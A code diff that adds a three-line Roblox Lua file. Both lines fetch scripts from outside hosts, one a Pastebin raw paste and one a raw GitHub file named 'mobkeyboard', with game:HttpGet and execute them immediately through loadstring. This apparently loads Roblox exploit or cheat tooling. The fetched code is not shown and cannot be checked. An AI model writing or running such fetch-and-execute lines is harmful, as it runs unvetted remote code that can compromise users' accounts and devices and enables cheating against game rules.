@@ -1,0 +1,3 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/5seCbYFa'),true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
